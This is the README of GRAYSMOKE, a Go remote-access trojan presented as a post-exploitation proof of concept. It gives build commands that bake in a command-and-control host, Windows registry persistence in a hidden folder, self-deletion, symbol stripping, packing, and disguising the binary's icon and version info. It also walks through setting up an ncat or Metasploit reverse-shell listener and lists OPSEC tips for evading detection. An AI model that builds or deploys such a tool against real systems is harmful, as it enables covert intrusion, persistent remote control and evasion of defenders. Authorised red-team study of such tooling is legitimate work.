## GRAYSMOKE
[![License](https://img.shields.io/badge/license-MIT-_red.svg)](https://opensource.org/licenses/MIT)
[![Go Report Card](https://goreportcard.com/badge/github.com/schwartz1375/graysmoke)](https://goreportcard.com/report/github.com/schwartz1375/graysmoke)

GRAYSMOKE is golang cross-platform post exploitation RAT poof of concept (POC).

## Features
* Cross-platform RAT, call backs to either to a ncat listener or Metasploit
* TLS encrypted in transit with server finger print embedded in the client to prevent MiTM on the self-signed certificate
* Supports fully qualified domain names (FQDN), and both IPv4 and IPv6 for parameters to build the binary and callbacks
```
make macos64 HOST=c2.example.com PORT=8080 PURGE=flase DELAY=0
make macos64 HOST="[::1]" PORT=8080 PURGE=flase DELAY=0
make windows64 HOST=192.168.221.128 PORT=8080 DELAY=0 INSTALL=true
callback [::1]:8080 sleep 10
callback 127.0.0.1:8080
```
* Supports sleeping (close the TLS TCP session) for a user specified time with automatic jitter
* Supports switching callback to a different C2
* On Linux it supports purging its self after the program exits
* Going beyond just ```go build``` 
    * Trimpath build flag, removes all file system paths from the compiled executable
    * ldflags "-s -w" 
        * -s Omit the symbol table and debug information.
        * -w Omit the DWARF symbol table.
 
* Windows specific:
    * Supports custom Microsoft Windows File Properties/Version information and icon (see ```resource/[icon.ico or verioninfo.json]```)
    * Has the persistence ability (copies itself to a hidden& archived folder and uses a registry key see 
 ```installer/installer_windows.go```) 

## Dependices
* [Go](https://golang.org/) 1.16+
* GNU make
* [goversioninfo](https://github.com/josephspurrier/goversioninfo) (needed to add the windows resource information to the binary)
* osslsigncode (needed to sign the windows binary) if you don't care about signing you can comment these lines out in the Makefile.
* Packers, consider using a packer such as UPX for a smaller binary

## How to build
To get the POC working you shouldn't have to modify anything other than leveraging ```make``` with this with appropriate target and options (see the Makefile for details).  Note, you may also need to run "make depends" first to generate the generate self-signed certificate. 

* HOST - The host parameter is the IPaddr or FQDN for the C2 server (where you want the RAT to callback to).
* DELAY - Time in seconds before establishing the instal calling back.  Note that automatic jitter is added to the callback sleep commands when inter acating with GShell (e.g. ```callback 127.0.0.1:8080 sleep 60```) but not delay
* PURGE - Windows does not support windows.Unlink(file) on its self, so ```PURGE=false```. Lastly while possible it is recommended to NOT set both PURGE and DELAY simultaneously (e.g. PURGE=true and DELAY=10) for macOS Big Sur as this will result in unexpected behavior.  
* INSTALL -On macOS and Linux do not have a native install/persistence options so ```INSTALL=false``` is set in the Makefile, thus there is no reason to pass it on the build line.  

Examples
```
make depends [builds self-signed certificate]]
make windows64 HOST=192.168.221.128 PORT=8080 DELAY=0 INSTALL=true
```
The system supports ```make clean ``` note that make clean NOT delete the self-signed certificate (server pem & key file)]

More examples 
```
make linux64 HOST=192.168.221.128 PORT=8080 PURGE=true DELAY=10  
make macos64 HOST=192.168.221.128 PORT=8080 PURGE=flase DELAY=0
make macos64 HOST="[::1]" PORT=8080 PURGE=flase DELAY=0
make windows64 HOST=192.168.221.128 PORT=8080 DELAY=0 INSTALL=true
make windows64 HOST=192.168.221.128 PORT=8080 DELAY=60 INSTALL=true
```

### On The Target Host (Post Exploit)
Execute the binary on the target and watch for the call back to the HOST.  Note the build outputs to graysmoke\bin directory

### C2 Server
There are two options, one is leveraging ncat, the other is the metasploit framework:

* Ncat
```ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 8080```

* Metasploit
Combine the server key and server pem file into one 

    ```cat server.key >> server.pem```

    This will be needed when setting ```HandlerSSLCert``` option

    Start metasploit ```msfconsole```

    ```
    msf5 > use exploit/multi/handler
    msf5 > set payload python/shell_reverse_tcp_ssl
    msf5 > set HandlerSSLCert ./server.pem
    msf5 > set stagerverifysslcert true 
    msf5 > set lhost 0.0.0.0  
    msf5 > set lport 8080
    msf5 > exploit -j
    ```
    The reason we set the ```stagerverifysslcert true ``` is to enable [TLS Certificate Pinning](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-HTTP-Communication#tls-certificate-pinning)

## OPSEC
Things to consider
* The name of the binary
* The binary has multiple log.Println()
* Windows specific:
    * Persistence mechanism
    * The icon 
    * The values in the ./resource/verioninfo.json file especially "OriginalFilename" - this should match the binary name set in the Makefile

